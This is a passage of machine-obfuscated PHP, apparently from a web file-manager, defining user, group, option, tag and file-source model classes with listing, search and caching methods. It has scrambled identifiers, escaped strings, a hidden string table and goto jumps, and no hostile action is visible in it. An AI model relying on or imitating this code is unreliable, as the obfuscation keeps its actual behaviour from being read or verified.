=> $ŸÅœŒ‚, $óœ¡ÒŞí[1958] => $•€İƒÇ“, $óœ¡ÒŞí[1878] => 0); } return Model($óœ¡ÒŞí[1944])->addAll($ú’ù²Ş„, array(), !0); } protected function userGroupRemove($á€Ï’Àó, $¾º©î®æ) { $“ûØ‘ãö =& $_SERVER[ĞÂ¤àÓï]; $‘ãüêïí = $this->getInfoSimple($á€Ï’Àó); if (!$‘ãüêïí || !$¾º©î®æ) { return !1; } $œìıæş = array($“ûØ‘ãö[1655] => $á€Ï’Àó, $“ûØ‘ãö[1942] => $¾º©î®æ); return Model($“ûØ‘ãö[1944])->where($œìıæş)->delete(); } public function listData() { $ŠÑÍÏı = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ŠÑÍÏı[$_SERVER[ĞÂ¤àÓï][369]]); return $ŠÑÍÏı; } public function listByID($ìÌââ«É) { $–ÂšÎƒĞ =& $_SERVER[ĞÂ¤àÓï]; if (!$ìÌââ«É) { return; } $¯¥ÙíÛí = array($–ÂšÎƒĞ[1664] => array($–ÂšÎƒĞ[7], $ìÌââ«É)); $À’­ı·¼ = $this->where($¯¥ÙíÛí)->select(); $À’­ı·¼ = array_sort_keep($À’­ı·¼, $–ÂšÎƒĞ[1664], $ìÌââ«É); $this->_listDataApply($À’­ı·¼); return $À’­ı·¼; } public function listByGroup($âû…ÛÊŸ = 0, $Ô›ò…Êó = array()) { $¬«‡™ =& $_SERVER[ĞÂ¤àÓï]; $ş°¿¨ûÀ = $¬«‡™[12]; $À‘»ñ·Û = array(); if ($âû…ÛÊŸ) { $À‘»ñ·Û = array($¬«‡™[2332] => intval($âû…ÛÊŸ)); $ş°¿¨ûÀ = "\x4c\x45\106\124\x20\112\x4f\111\116\40{$this->tablePrefix}\165\163\x65\x72\x5f\147\162\x6f\x75\160\40\x75\x73\x65\x72\137\147\162\157\165\x70\x20\x6f\x6e\40\165\x73\x65\x72\x2e\165\163\145\162\111\x44\x20\75\x20\165\163\x65\162\x5f\147\162\x6f\165\160\x2e\x75\163\x65\x72\111\x44"; $õ÷â¾ûë = Input::get($¬«‡™[457], null, $¬«‡™[12]) ? $¬«‡™[12] : $¬«‡™[2333]; } if (isset($Ô›ò…Êó[$¬«‡™[749]])) { $À‘»ñ·Û[$¬«‡™[2334]] = $Ô›ò…Êó[$¬«‡™[749]]; } $ù£Ø³£é = $this->_makeOrder($õ÷â¾ûë)->field($¬«‡™[2335])->where($À‘»ñ·Û)->join($ş°¿¨ûÀ)->selectPage(50); $this->_listDataApply($ù£Ø³£é[$¬«‡™[369]]); return $ù£Ø³£é; } private function _makeOrder($« íßÃ® = '') { $‚¤²Û¯± =& $_SERVER[ĞÂ¤àÓï]; $ºò¹ÉØ = array($‚¤²Û¯±[1664], $‚¤²Û¯±[32], $‚¤²Û¯±[1843], $‚¤²Û¯±[1815], $‚¤²Û¯±[200]); $ïëıç“½ = array($‚¤²Û¯±[450] => $‚¤²Û¯±[451], $‚¤²Û¯±[452] => $‚¤²Û¯±[453]); $ØÇŞâÔ¹ = Input::get($‚¤²Û¯±[457], $‚¤²Û¯±[7], $‚¤²Û¯±[1655], $ºò¹ÉØ); $¸”Øœ±· = Input::get($‚¤²Û¯±[458], $‚¤²Û¯±[7], $‚¤²Û¯±[1945], array($‚¤²Û¯±[1945], $‚¤²Û¯±[452])); $¸”Øœ±· = $ïëıç“½[$¸”Øœ±·]; $« íßÃ® = $« íßÃ® . "\165\x73\x65\162\56{$ØÇŞâÔ¹}\40{$¸”Øœ±·}\x2c\40\165\163\145\x72\56\165\x73\x65\162\111\104\40\x61\163\x63"; return $this->alias($‚¤²Û¯±[2067])->order($« íßÃ®); } public function listSearch($¨û¼ş‡) { $Å¥­¼¨¯ =& $_SERVER[ĞÂ¤àÓï]; $¸õ˜ú–ß = $¨û¼ş‡[$Å¥­¼¨¯[1948]]; $´ßóç¯Ó = isset($¨û¼ş‡[$Å¥­¼¨¯[1949]]) ? $¨û¼ş‡[$Å¥­¼¨¯[1949]] : !1; $¸õ˜ú–ß = str_replace($Å¥­¼¨¯[1950], $Å¥­¼¨¯[1951], trim($¸õ˜ú–ß)); $Ôå¿œ—ø = array($Å¥­¼¨¯[32] => array($Å¥­¼¨¯[383], "\45{$¸õ˜ú–ß}\x25"), $Å¥­¼¨¯[305] => array($Å¥­¼¨¯[383], "{$¸õ˜ú–ß}\x25"), $Å¥­¼¨¯[542] => array($Å¥­¼¨¯[383], "{$¸õ˜ú–ß}\x25"), $Å¥­¼¨¯[1000] => $Å¥­¼¨¯[1952]); if (Input::check($¸õ˜ú–ß, $Å¥­¼¨¯[311])) { $Ôå¿œ—ø[$Å¥­¼¨¯[1664]] = array($Å¥­¼¨¯[383], "{$¸õ˜ú–ß}\x25"); $Ôå¿œ—ø[$Å¥­¼¨¯[2317]] = array($Å¥­¼¨¯[383], "{$¸õ˜ú–ß}\x25"); } if (!$¸õ˜ú–ß) { $Ôå¿œ—ø = array(); } if (isset($¨û¼ş‡[$Å¥­¼¨¯[749]])) { $Ôå¿œ—ø[$Å¥­¼¨¯[749]] = $¨û¼ş‡[$Å¥­¼¨¯[749]]; } $Ôå¿œ—ø = $this->parseWhereLike($Ôå¿œ—ø); $º«åÒş = $this->_makeOrder()->where($Ôå¿œ—ø)->selectPage(20); if (!$º«åÒş || count($º«åÒş[$Å¥­¼¨¯[369]]) < 5 && Input::check($¸õ˜ú–ß, $Å¥­¼¨¯[318])) { $¾Å¾ËÉ = $this->_searchFromMeta($Å¥­¼¨¯[464], $¸õ˜ú–ß, 10); $à‡Ğ° = $this->_searchFromMeta($Å¥­¼¨¯[465], $¸õ˜ú–ß, 10); $ €ÂÜÜ‘ = array_merge($¾Å¾ËÉ, $à‡Ğ°, $º«åÒş[$Å¥­¼¨¯[369]]); $º«åÒş[$Å¥­¼¨¯[369]] = array_unique_by_key($ €ÂÜÜ‘, $Å¥­¼¨¯[1664]); $º«åÒş[$Å¥­¼¨¯[366]][$Å¥­¼¨¯[367]] = count($º«åÒş[$Å¥­¼¨¯[369]]); $º«åÒş[$Å¥­¼¨¯[366]][$Å¥­¼¨¯[368]] = ceil($º«åÒş[$Å¥­¼¨¯[366]][$Å¥­¼¨¯[367]] / $º«åÒş[$Å¥­¼¨¯[366]][$Å¥­¼¨¯[363]]); } $this->_listDataApply($º«åÒş[$Å¥­¼¨¯[369]]); $this->_filterByGroup($º«åÒş, $´ßóç¯Ó); return $º«åÒş; } private function _filterByGroup(&$¿ç°Š», $ÉÙ°¡é) { $åøìÜ© =& $_SERVER[ĞÂ¤àÓï]; if (!$ÉÙ°¡é) { return $¿ç°Š»; } foreach ($¿ç°Š»[$åøìÜ©[369]] as $œ­ÈØÒÃ => &$ıÉà–Òˆ) { $Íˆê«”¡ = array_to_keyvalue($ıÉà–Òˆ[$åøìÜ©[2037]], $åøìÜ©[12], $åøìÜ©[1854]); if (!in_array($ÉÙ°¡é, $Íˆê«”¡)) { unset($¿ç°Š»[$åøìÜ©[369]][$œ­ÈØÒÃ]); } } unset($ıÉà–Òˆ); $¿ç°Š»[$åøìÜ©[369]] = array_values($¿ç°Š»[$åøìÜ©[369]]); $¿ç°Š»[$åøìÜ©[366]] = array($åøìÜ©[2101] => count($¿ç°Š»[$åøìÜ©[369]]), $åøìÜ©[2099] => $¿ç°Š»[$åøìÜ©[366]][$åøìÜ©[363]], $åøìÜ©[2098] => 1, $åøìÜ©[2100] => 1); } private function _searchFromMeta($ºş«°º¥, $ÚÔÛÏüà, $Æ€Âœ) { $ë§Ö­¡† =& $_SERVER[ĞÂ¤àÓï]; $ÚÔÛÏüà = strtolower($ÚÔÛÏüà); $İÔ®º = array($ë§Ö­¡†[94] => $ºş«°º¥, $ë§Ö­¡†[374] => array($ë§Ö­¡†[383], "\45{$ÚÔÛÏüà}\45")); $İÔ®º = $this->parseWhereLike($İÔ®º); $Ùøğ„ïƒ = Model($ë§Ö­¡†[2336])->where($İÔ®º)->limit($Æ€Âœ)->select(); if (!$Ùøğ„ïƒ) { return array(); } $Ùøğ„ïƒ = array_to_keyvalue($Ùøğ„ïƒ, $ë§Ö­¡†[12], $ë§Ö­¡†[1664]); $Õ¸ç—ı = $this->where(array($ë§Ö­¡†[1655] => array($ë§Ö­¡†[7], $Ùøğ„ïƒ)))->select(); if (!$Õ¸ç—ı) { return array(); } return $Õ¸ç—ı; } private function _listDataApplyItem($Í½‰Ï”á) { $¡ËúÔ¢ = array($Í½‰Ï”á); $this->_listDataApply($¡ËúÔ¢); return $¡ËúÔ¢[0]; } private function _listDataApply(&$ÚŒñšó¶) { $µë˜Ó‡Û =& $_SERVER[ĞÂ¤àÓï]; if (!$ÚŒñšó¶) { return; } array_remove_key($ÚŒñšó¶, $µë˜Ó‡Û[889]); $ğÄè¤´í = array_to_keyvalue($ÚŒñšó¶, $µë˜Ó‡Û[12], $µë˜Ó‡Û[1664]); $this->_listAppendGroup($ÚŒñšó¶, $ğÄè¤´í); $this->_listAppendMeta($ÚŒñšó¶, $ğÄè¤´í); $this->_listAppendSourceRoot($ÚŒñšó¶, $ğÄè¤´í); } private function _listAppendSourceRoot(&$“Ä¥Ûª³, $á§—áÙü) { $êùÖ€·é =& $_SERVER[ĞÂ¤àÓï]; $ó´øÏŸà = Model($êùÖ€·é[832])->listSourceRoot(SourceModel::TYPE_USER, $á§—áÙü); $ó´øÏŸà = array_to_keyvalue($ó´øÏŸà, $êùÖ€·é[505]); $ó´øÏŸà = array_remove_key($ó´øÏŸà, $êùÖ€·é[505]); foreach ($“Ä¥Ûª³ as &$Âµİ÷í¸) { $Âµİ÷í¸[$êùÖ€·é[86]] = $ó´øÏŸà[$Âµİ÷í¸[$êùÖ€·é[1664]]] ? $ó´øÏŸà[$Âµİ÷í¸[$êùÖ€·é[1664]]] : array(); } unset($Âµİ÷í¸); } private function _listAppendGroup(&$¤¶Àˆ·ƒ, $ôè¤êì) { $¸ÆÌ»õñ =& $_SERVER[ĞÂ¤àÓï]; $‰¥ª½½´ = array($¸ÆÌ»õñ[1664] => array($¸ÆÌ»õñ[7], $ôè¤êì)); $ò¨Ş—ı² = Model($¸ÆÌ»õñ[1944])->where($‰¥ª½½´)->select(); $ØÍ´¼êÉ = array_to_keyvalue($ò¨Ş—ı², $¸ÆÌ»õñ[12], $¸ÆÌ»õñ[1854]); $ØÍ´¼êÉ = array_remove_value(array_unique($ØÍ´¼êÉ), $¸ÆÌ»õñ[197]); if (!$ØÍ´¼êÉ || !$ò¨Ş—ı²) { return; } $‰¥ª½½´ = array($¸ÆÌ»õñ[1854] => array($¸ÆÌ»õñ[7], $ØÍ´¼êÉ)); $ó¶¹’æˆ = Model($¸ÆÌ»õñ[2035])->field($¸ÆÌ»õñ[2337])->where($‰¥ª½½´)->select(); $ó¶¹’æˆ = array_to_keyvalue($ó¶¹’æˆ, $¸ÆÌ»õñ[1854]); $ò¨Ş—ı² = array_to_keyvalue_group($ò¨Ş—ı², $¸ÆÌ»õñ[1664]); foreach ($ò¨Ş—ı² as &$ÇÇÕæ¥«) { $®õ–œ¯ = array(); foreach ($ÇÇÕæ¥« as $ğÁ‚—‚œ) { if (!$ğÁ‚—‚œ[$¸ÆÌ»õñ[1958]]) { continue; } $é‚Ü€¤› = Model($¸ÆÌ»õñ[507])->listData($ğÁ‚—‚œ[$¸ÆÌ»õñ[1958]]); $®õ–œ¯[] = array($¸ÆÌ»õñ[1854] => $ğÁ‚—‚œ[$¸ÆÌ»õñ[1854]], $¸ÆÌ»õñ[2338] => $ó¶¹’æˆ[$ğÁ‚—‚œ[$¸ÆÌ»õñ[1854]]][$¸ÆÌ»õñ[32]], $¸ÆÌ»õñ[521] => $ó¶¹’æˆ[$ğÁ‚—‚œ[$¸ÆÌ»õñ[1854]]][$¸ÆÌ»õñ[521]], $¸ÆÌ»õñ[413] => $é‚Ü€¤›); } $ÇÇÕæ¥« = $®õ–œ¯; } unset($ÇÇÕæ¥«); foreach ($¤¶Àˆ·ƒ as &$ÇãÇ‰æº) { $ÇãÇ‰æº[$¸ÆÌ»õñ[2037]] = array(); if (isset($ò¨Ş—ı²[$ÇãÇ‰æº[$¸ÆÌ»õñ[1664]]])) { $ÇãÇ‰æº[$¸ÆÌ»õñ[2037]] = $ò¨Ş—ı²[$ÇãÇ‰æº[$¸ÆÌ»õñ[1664]]]; } } unset($ÇãÇ‰æº); } public function userAppendGroup($•¯°Òşª) { $Ù¦úªŒ– =& $_SERVER[ĞÂ¤àÓï]; if (!$•¯°Òşª) { return array(); } $this->_listAppendGroup($•¯°Òşª, array_to_keyvalue($•¯°Òşª, $Ù¦úªŒ–[12], $Ù¦úªŒ–[1664])); return $•¯°Òşª; } private function _listAppendMeta(&$¦³œÁß, $äâ•×İı) { $£àŞ´Ñ¥ =& $_SERVER[ĞÂ¤àÓï]; $ÇÌ‘â = UserJobModel::JOB_KEY; $º®õÏÊß = array($£àŞ´Ñ¥[2318]); $“úëàç¥ = array($£àŞ´Ñ¥[1664] => array($£àŞ´Ñ¥[7], $äâ•×İı)); $£Ç“¹‹À = Model($£àŞ´Ñ¥[2316])->where($“úëàç¥)->select(); $£Ç“¹‹À = array_to_keyvalue_group($£Ç“¹‹À, $£àŞ´Ñ¥[1664]); foreach ($£Ç“¹‹À as &$ÑÉÂƒÆ) { $«©­Ï±û = array(); foreach ($ÑÉÂƒÆ as $Î‡Å») { if (!in_array($Î‡Å»[$£àŞ´Ñ¥[94]], $º®õÏÊß)) { $«©­Ï±û[$Î‡Å»[$£àŞ´Ñ¥[94]]] = $Î‡Å»[$£àŞ´Ñ¥[374]]; } } $ÑÉÂƒÆ = $«©­Ï±û; } unset($ÑÉÂƒÆ); $šô—±óò = Model($£àŞ´Ñ¥[2339]); foreach ($¦³œÁß as &$ã‹©ËÌâ) { $¹Ì×üä® = array(); if (isset($£Ç“¹‹À[$ã‹©ËÌâ[$£àŞ´Ñ¥[1664]]])) { $¹Ì×üä® = $£Ç“¹‹À[$ã‹©ËÌâ[$£àŞ´Ñ¥[1664]]]; } $ã‹©ËÌâ[$£àŞ´Ñ¥[2340]] = array(); if (isset($¹Ì×üä®[$ÇÌ‘â])) { $ã‹©ËÌâ[$£àŞ´Ñ¥[2340]] = $šô—±óò->getUserJobInfo($¹Ì×üä®[$ÇÌ‘â]); } } unset($ã‹©ËÌâ); } protected function groupUserAll($‡ùÖî–) { $ı¢ÈÈ¢ =& $_SERVER[ĞÂ¤àÓï]; if (!$‡ùÖî–) { return !1; } $–Âšİø† = Model($ı¢ÈÈ¢[1944])->field($ı¢ÈÈ¢[1664])->where(array($ı¢ÈÈ¢[1854] => array($ı¢ÈÈ¢[7], $‡ùÖî–)))->select(); $–Âšİø† = array_to_keyvalue($–Âšİø†, $ı¢ÈÈ¢[12], $ı¢ÈÈ¢[1664]); return array_unique($–Âšİø†); } public function userSearch($ÙÜÄ‡Å©, $ÇŸùàş‚ = "\52") { return Model($_SERVER[ĞÂ¤àÓï][535])->where($ÙÜÄ‡Å©)->field($ÇŸùàş‚)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($÷§ÄÕĞ) { $ˆ±«ƒäÈ =& $_SERVER[ĞÂ¤àÓï]; if (!defined($ˆ±«ƒäÈ[475])) { define($ˆ±«ƒäÈ[475], 0); } return "\125\x73\x65\162\x4f\160\164\151\157\156\137{$÷§ÄÕĞ}\137" . USER_ID; } protected function filterWhere($Ññëş¦â) { $ôÉ¿ÚĞÕ =& $_SERVER[ĞÂ¤àÓï]; if (!defined($ôÉ¿ÚĞÕ[475])) { define($ôÉ¿ÚĞÕ[475], 0); } $Ññëş¦â[$ôÉ¿ÚĞÕ[1664]] = USER_ID; return $Ññëş¦â; } public function cacheRemoveUser($¤ß–İÖ‹, $Ç¤Òê) { return Cache::remove("\x55\x73\x65\x72\117\160\x74\151\157\x6e\x5f{$¤ß–İÖ‹}\137" . $Ç¤Òê); } protected function optionDefault($á©ò¸ß = '') { $ºæŒó¸• =& $_SERVER[ĞÂ¤àÓï]; if ($á©ò¸ß == $ºæŒó¸•[12]) { return $GLOBALS[$ºæŒó¸•[6]][$ºæŒó¸•[2341]]; } if ($á©ò¸ß == $ºæŒó¸•[2342]) { return $GLOBALS[$ºæŒó¸•[6]][$ºæŒó¸•[2343]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\x74\141\147\x4c\x69\163\x74"; public $modelType = "\x55\x73\145\x72\117\x70\x74\x69\x6f\156"; public $field = array("\x6e\141\155\145", "\163\x74\171\x6c\x65", "\163\157\162\x74"); public function listData($á·÷Õ¯“ = false, $Š›ª£œ = "\163\x6f\x72\x74", $‹´İ¼œ» = false) { return parent::listData($á·÷Õ¯“, $Š›ª£œ, $‹´İ¼œ»); } public function remove($äÅ–Çí) { return parent::remove($äÅ–Çí); } public function add($¼°±ëÎ, $Ô‚Öèıö = "\154\141\x62\x65\x6c\55\147\162\145\171\x2d\156\157\162\155\141\x6c") { $éœ‚¸â =& $_SERVER[ĞÂ¤àÓï]; if ($this->findByName($¼°±ëÎ)) { return !1; } $ØÆİøˆ = array($éœ‚¸â[420] => $¼°±ëÎ, $éœ‚¸â[485] => $Ô‚Öèıö, $éœ‚¸â[1858] => $this->getSort($éœ‚¸â[258]) + 1); return parent::insert($ØÆİøˆ); } public function update($—ĞûºŸ­, $É‘Æô“) { $ó¹ÀğÃ =& $_SERVER[ĞÂ¤àÓï]; $ßÜÕ©Ä = $this->listData($—ĞûºŸ­); $ÅÖŞŞØ = $this->findByName($É‘Æô“[$ó¹ÀğÃ[32]]); if (!$ßÜÕ©Ä || $ÅÖŞŞØ && $ÅÖŞŞØ[$ó¹ÀğÃ[399]] != $ßÜÕ©Ä[$ó¹ÀğÃ[399]]) { return !1; } return parent::update($—ĞûºŸ­, $É‘Æô“); } public function moveTop($ ¾³Óşë) { $¿“Ğ¹ºº =& $_SERVER[ĞÂ¤àÓï]; $¼‘Ï¬”Œ = parent::listData(); $Ô—¯ëâÆ = $this->getSort($¿“Ğ¹ºº[257]); foreach ($¼‘Ï¬”Œ as &$ù™™—ûÈ) { if ($ù™™—ûÈ[$¿“Ğ¹ºº[399]] == $ ¾³Óşë) { $ù™™—ûÈ[$¿“Ğ¹ºº[1878]] = $Ô—¯ëâÆ; continue; } $ù™™—ûÈ[$¿“Ğ¹ºº[1878]] += 1; } unset($ù™™—ûÈ); return parent::resetData($¼‘Ï¬”Œ); } public function moveBottom($¶‹æ´Äé) { $‚îöÉ…Û =& $_SERVER[ĞÂ¤àÓï]; $ªæÖúÁ  = $this->getSort($‚îöÉ…Û[258]) + 1; return parent::update($¶‹æ´Äé, array($‚îöÉ…Û[1878] => $ªæÖúÁ )); } public function resetSort($’ß¦¸ ) { $£ãğŸÇÈ =& $_SERVER[ĞÂ¤àÓï]; $ŸÉ¹°Ÿ“ = array(); $’ß¦¸  = is_array($’ß¦¸ ) ? $’ß¦¸  : array(); for ($ÁÌÁ¶×… = 0; $ÁÌÁ¶×… < count($’ß¦¸ ); $ÁÌÁ¶×…++) { $ŸÉ¹°Ÿ“[$’ß¦¸ [$ÁÌÁ¶×…] . $£ãğŸÇÈ[12]] = $ÁÌÁ¶×… + 1; } $İ¶ƒÕù³ = parent::listData(); foreach ($İ¶ƒÕù³ as &$óÄ˜—ŸÉ) { $Ê‚±ĞŸ = $ŸÉ¹°Ÿ“[$óÄ˜—ŸÉ[$£ãğŸÇÈ[399]]]; $óÄ˜—ŸÉ[$£ãğŸÇÈ[1878]] = $Ê‚±ĞŸ ? $Ê‚±ĞŸ : $óÄ˜—ŸÉ[$£ãğŸÇÈ[1878]]; } unset($óÄ˜—ŸÉ); return parent::resetData($İ¶ƒÕù³); } private function getSort($†«ğ¨ò¤) { $µ‘¦šñ =& $_SERVER[ĞÂ¤àÓï]; $ºÊ›’º© = parent::listData(); $¯Êµ¦òÑ = array_to_keyvalue($ºÊ›’º©, $µ‘¦šñ[12], $µ‘¦šñ[1878]); if (!$¯Êµ¦òÑ) { $¯Êµ¦òÑ = array(0); } $§ª‰ï› = $†«ğ¨ò¤ == $µ‘¦šñ[258] ? max($¯Êµ¦òÑ) : min($¯Êµ¦òÑ); return intval($§ª‰ï›); } } goto aÄì˜‹ä‹•; FÀ‚¥”ù¯¦: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ó‡™‘È× = false, $İï¦î¨ğ = '', $ ßæ¢Ú¥ = false) { $åÑŒóÌ =& $_SERVER[ĞÂ¤àÓï]; $ÁµÆ’øË = $this->cacheGet($İï¦î¨ğ); $ÃÁ·Ğı½ = $this->optionDefault($İï¦î¨ğ); $ÃÁ·Ğı½ = is_array($ÃÁ·Ğı½) ? $ÃÁ·Ğı½ : array(); if (is_array($ÁµÆ’øË)) { $ÁµÆ’øË = array_merge($ÃÁ·Ğı½, $ÁµÆ’øË); return $Ó‡™‘È× ? isset($ÁµÆ’øË[$Ó‡™‘È×]) ? $ÁµÆ’øË[$Ó‡™‘È×] : null : $ÁµÆ’øË; } $ÌñúÀÀ = $this->filterWhere(array($åÑŒóÌ[33] => $İï¦î¨ğ)); $ÁµÆ’øË = $this->where($ÌñúÀÀ)->select(); $ÁµÆ’øË = array_to_keyvalue($ÁµÆ’øË, $åÑŒóÌ[94], $åÑŒóÌ[374]); foreach ($ÁµÆ’øË as $İÇŸ÷Òì => $¦®¨Ëó²) { if ($ ßæ¢Ú¥ || in_array($İÇŸ÷Òì, $this->jsonField)) { $ÁµÆ’øË[$İÇŸ÷Òì] = json_decode($¦®¨Ëó², !0); } } $this->cacheSet($İï¦î¨ğ, $ÁµÆ’øË); $ÁµÆ’øË = array_merge($ÃÁ·Ğı½, $ÁµÆ’øË); return $Ó‡™‘È× ? $ÁµÆ’øË[$Ó‡™‘È×] : $ÁµÆ’øË; } public function set($ÅÍåòç, $ªĞ²Ù = false, $³°š¤šÎ = '') { $ÍñÄ¦¤ =& $_SERVER[ĞÂ¤àÓï]; $this->cacheRemove($³°š¤šÎ); $Ó†Ñ„Ú– = array(); $ûµè´† = is_array($ÅÍåòç) ? $ÅÍåòç : array($ÅÍåòç => $ªĞ²Ù); foreach ($ûµè´† as $·²—ãõå => $®©ˆ©„) { if (is_array($®©ˆ©„)) { $®©ˆ©„ = json_encode_force($®©ˆ©„); } $this->checkLength($®©ˆ©„, !1, $this->tableName . $ÍñÄ¦¤[4] . $ÅÍåòç); $®©ˆ©„ = self::textEncode($®©ˆ©„); $ûµè´† = array($ÍñÄ¦¤[33] => $³°š¤šÎ, $ÍñÄ¦¤[94] => $·²—ãõå, $ÍñÄ¦¤[374] => $®©ˆ©„); $Ó†Ñ„Ú–[] = $this->filterWhere($ûµè´†); } if (!$Ó†Ñ„Ú–) { return !0; } $ÎÜ‰‡áµ = $this->cacheKey($ÍñÄ¦¤[400]); CacheLock::lock($ÎÜ‰‡áµ); $÷“Á÷ß“ = $this->addAll($Ó†Ñ„Ú–, array(), !0); CacheLock::unlock($ÎÜ‰‡áµ); return $÷“Á÷ß“; } protected function optionDefault($Š•ó˜ò‚ = '') { return !1; } public function setDeep($ï¼ö²Ç, $’ÚšîÄš = false, $ŞÔÉÔŸ³ = '') { $¾Šî«İ = explode($_SERVER[ĞÂ¤àÓï][10], $ï¼ö²Ç); $±¯ïÎÑá = $this->get(); array_set_value($±¯ïÎÑá, $ï¼ö²Ç, $’ÚšîÄš); $this->set($¾Šî«İ[0], $±¯ïÎÑá[$¾Šî«İ[0]], $ŞÔÉÔŸ³); } public function remove($…ÃÜ›û, $Ò “£Ù› = '') { $ÆúôÏ¨ =& $_SERVER[ĞÂ¤àÓï]; $this->cacheRemove($Ò “£Ù›); $±ÖÇ¯ëÀ = $this->filterWhere(array($ÆúôÏ¨[94] => $…ÃÜ›û, $ÆúôÏ¨[33] => $Ò “£Ù›)); if (is_null($…ÃÜ›û)) { unset($±ÖÇ¯ëÀ[$ÆúôÏ¨[94]]); } return $this->where($±ÖÇ¯ëÀ)->delete(); } public function cacheSet($¨Ò¥¿í¼, $ÛŸÊ¤‰İ = false) { return Cache::set($this->cacheKey($¨Ò¥¿í¼), $ÛŸÊ¤‰İ); } public function cacheGet($³¬”éü) { return Cache::get($this->cacheKey($³¬”éü)); } public function cacheRemove($ŞÔ¡¾Ã) { return Cache::remove($this->cacheKey($ŞÔ¡¾Ã)); } protected function filterWhere($Ğ¼î¤éã) { return $Ğ¼î¤éã; } protected function cacheKey($ĞÛÊœ£Ä) { return $ĞÛÊœ£Ä; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\143\145"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\x6d\x65" => "\x69\x6f\137\163\157\x75\x72\143\145\x5f\x6d\145\164\141", "\x6d\x65\x74\141\x46\151\x65\154\x64" => "\163\157\x75\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\164", "\146\165\156\x63\164\151\157\x6e"), array("\x63\x72\x65\141\164\145\124\151\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\145\162\x74", "\x66\165\x6e\143\164\151\x6f\x6e"), array("\166\x69\x65\x77\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\x74", "\x66\165\x6e\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($éÉŞ¨š¾) { return $this->listSource(array($_SERVER[ĞÂ¤àÓï][401] => $éÉŞ¨š¾)); } public function typeName($Ÿ»Ğãİ–) { static $Î±Š”º = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\162\157\165\160"); return $Î±Š”º[$Ÿ»Ğãİ– . $_SERVER[ĞÂ¤àÓï][12]]; } public function sourceListInfo($Ô²µÉÆ³, $Ûİ†ÃÂ = false) { $ÕÛı›£š =& $_SERVER[ĞÂ¤àÓï]; $Ô²µÉÆ³ = $Ô²µÉÆ³ ? $Ô²µÉÆ³ : array(); $Ô²µÉÆ³ = array_filter(array_unique($Ô²µÉÆ³)); if (!$Ô²µÉÆ³) { return array(); } $¤·¥À‚Ş = $this->where(array($ÕÛı›£š[402] => array($ÕÛı›£š[7], $Ô²µÉÆ³)))->select(); $this->_listDataApply($¤·¥À‚Ş, $Ûİ†ÃÂ); return array_to_keyvalue($¤·¥À‚Ş, $ÕÛı›£š[402]); } public function pathInfoFilter(&$é‘¸Øß) { $Æ«¬°µÆ =& $_SERVER[ĞÂ¤àÓï]; static $Ì…Ê·æº = false; static $“ğ÷ÈÕÖ = false; static $ŸßŞÕ·¯ = false; if (!$Ì…Ê·æº) { $â¿ıŸ†İ = $Æ«¬°µÆ[403]; $â¿ıŸ†İ .= $Æ«¬°µÆ[404]; $â¿ıŸ†İ .= $Æ«¬°µÆ[405]; $í÷Ùä˜ = $Æ«¬°µÆ[406]; $ŠÜË’õé = explode($Æ«¬°µÆ[50], $í÷Ùä˜); $Ì…Ê·æº = explode($Æ«¬°µÆ[50], $â¿ıŸ†İ); $“ğ÷ÈÕÖ = array(); foreach ($Ì…Ê·æº as $í‘÷˜İ­) { if (in_array($í‘÷˜İ­, $ŠÜË’õé)) { continue; } $“ğ÷ÈÕÖ[] = $í‘÷˜İ­; } $ŸßŞÕ·¯ = explode($Æ«¬°µÆ[50], $Æ«¬°µÆ[407]); } foreach ($ŸßŞÕ·¯ as $ˆ•Ì¹‚¡) { if (isset($é‘¸Øß[$ˆ•Ì¹‚¡])) { $é‘¸Øß[$ˆ•Ì¹‚¡] = intval($é‘¸Øß[$ˆ•Ì¹‚¡]); } } $é‘¸Øß[$Æ«¬°µÆ[84]] = $Æ«¬°µÆ[408] . $é‘¸Øß[$Æ«¬°µÆ[402]] . $Æ«¬°µÆ[409]; $é‘¸Øß[$Æ«¬°µÆ[33]] = $é‘¸Øß[$Æ«¬°µÆ[410]] == 1 ? $Æ«¬°µÆ[75] : $Æ«¬°µÆ[199]; $é‘¸Øß[$Æ«¬°µÆ[411]] = $this->typeName($é‘¸Øß[$Æ«¬°µÆ[411]]); if ($é‘¸Øß[$Æ«¬°µÆ[410]] != 1) { $é‘¸Øß[$Æ«¬°µÆ[174]] = $é‘¸Øß[$Æ«¬°µÆ[412]]; unset($é‘¸Øß[$Æ«¬°µÆ[412]]); } $ã×ÏËÌº = $Ì…Ê·æº; if (isset($é‘¸Øß[$Æ«¬°µÆ[413]]) && $é‘¸Øß[$Æ«¬°µÆ[413]][$Æ«¬°µÆ[414]] == -1) { $ã×ÏËÌº = $“ğ÷ÈÕÖ; } $é‘¸Øß = array_field_key($é‘¸Øß, $ã×ÏËÌº); return $é‘¸Øß; } public function listUserFav() { $™Ú·Èæ =& $_SERVER[ĞÂ¤àÓï]; $”ëŒ¡©ë = Model($™Ú·Èæ[415])->listData(); $±ÓÓ¥ˆ = array_filter_by_field($”ëŒ¡©ë, $™Ú·Èæ[33], $™Ú·Èæ[416]); $±ÓÓ¥ˆ = array_to_keyvalue($±ÓÓ¥ˆ, $™Ú·Èæ[12], $™Ú·Èæ[84]); if ($±ÓÓ¥ˆ) { $‘ÂÃúÒ = $this->listSource(array($™Ú·Èæ[417] => array($™Ú·Èæ[418], $±ÓÓ¥ˆ))); } $‘ÂÃúÒ = array_to_keyvalue($‘ÂÃúÒ[$™Ú·Èæ[369]], 